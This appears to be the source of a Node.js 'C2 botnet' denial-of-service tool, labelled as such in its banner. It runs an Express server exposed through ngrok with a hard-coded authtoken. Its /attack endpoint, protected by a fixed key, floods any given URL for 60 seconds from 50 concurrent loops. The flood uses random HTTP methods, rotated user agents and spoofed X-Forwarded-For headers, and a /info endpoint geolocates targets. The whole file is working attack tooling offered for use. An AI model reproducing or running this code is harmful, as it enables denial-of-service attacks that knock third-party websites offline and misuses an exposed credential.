require('colors');
const express = require('express');
const ngrok = require('ngrok');
const axios = require('axios');
const app = express();
const bodyParser = require('body-parser');
const crypto = require('crypto');

// Middleware
app.use(bodyParser.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Global variables
let C = false;
let targetInfo = {};
let currentPort = process.env.PORT || Math.floor(Math.random() * (60000 - 3000 + 1)) + 3000;
let ngrokUrl = null;

const L = () => {
  console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] Denial Of Service
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] Update : 23 January
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `.cyan);
  console.log(`C2 BOTNET VERSION\n`.yellow);
};

const startNgrok = async () => {
  try {
    await ngrok.kill();
    await ngrok.authtoken('2xclrXeyimoudAtLmDQu7DibbSJ_42dYjd7bccEoCS23svLnA');
    
    ngrokUrl = await ngrok.connect({
      proto: 'http',
      addr: currentPort,
      region: 'ap',
      onStatusChange: status => {
        if (status === 'closed') {
          console.log('Ngrok connection closed, attempting to reconnect...'.yellow);
          setTimeout(startNgrok, 5000);
        }
      }
    });
    
    console.log(`\n${'[ API C2 ] :'.bold} ${ngrokUrl.underline}`);
    console.log(`${'[ INFO ] : [ MENUNGGU ]'.yellow}\n`);
    return ngrokUrl;
  } catch (e) {
    console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
    console.log('Attempting to restart ngrok in 5 seconds...'.yellow);
    setTimeout(startNgrok, 5000);
    return null;
  }
};

const A = async (target, duration) => {
  const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36'
  ];

  console.log(`\n${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
  console.log(`${'⏳'.cyan} ${'[ DURASI ]:'.bold} ${duration.toString().yellow} detik\n`);

  const AP = [];
  const startTime = Date.now();
  
  for (let i = 0; i < 50; i++) {
    AP.push(new Promise(async (resolve) => {
      while (Date.now() - startTime < duration * 1000) {
        try {
          await axios({
            method: methods[Math.floor(Math.random() * methods.length)],
            url: target,
            headers: {
              'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
              'X-Forwarded-For': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`,
              'Accept-Language': 'en-US,en;q=0.9',
              'Cache-Control': 'no-cache'
            },
            timeout: 2500,
            validateStatus: false
          });
        } catch (e) {}
      }
      resolve();
    }));
  }

  await Promise.all(AP);
  console.log(`\n${'✓'.green} ${'[ SUCCESS ]'.bold}\n`);
  C = false;
};

app.post('/attack', async (req, res) => {
  if (C) return res.status(429).json({ error: '[ PROSES ]' });
  
  const { target, apiKey } = req.body;
  if (apiKey !== 'TERMUX_KEY') return res.status(403).json({ error: 'Akses tidak valid' });

  try {
    new URL(target);
    C = true;
    A(target, 60);
    res.status(200).json({ status: '[ START ]', target });
  } catch (e) {
    res.status(400).json({ error: '[ URL INVALID! ]' });
  }
});

app.get('/info', async (req, res) => {
  try {
    const response = await axios.get(`http://ip-api.com/json/${new URL(req.query.target).hostname}`);
    res.json(response.data);
  } catch (e) {
    res.status(500).json({ error: '[ GAGAL MENCARI INFORMASI ]' });
  }
});

const startServer = async () => {
  try {
    L();
    app.listen(currentPort, async () => {
      console.log(`${'[ RUNING ] :'.bold} ${currentPort.toString().yellow}`);
      await startNgrok();
    });
  } catch (error) {
    console.log(`\n${'×'.red} ${'[ SERVER ERROR ] :'.bold} ${error.message}`);
    process.exit(1);
  }
};

process.on('SIGINT', async () => {
  try {
    await ngrok.kill();
    console.log('\nServer stopped'.yellow);
    process.exit(0);
  } catch (error) {
    console.log('Error stopping server:'.red, error);
    process.exit(1);
  }
});

startServer();
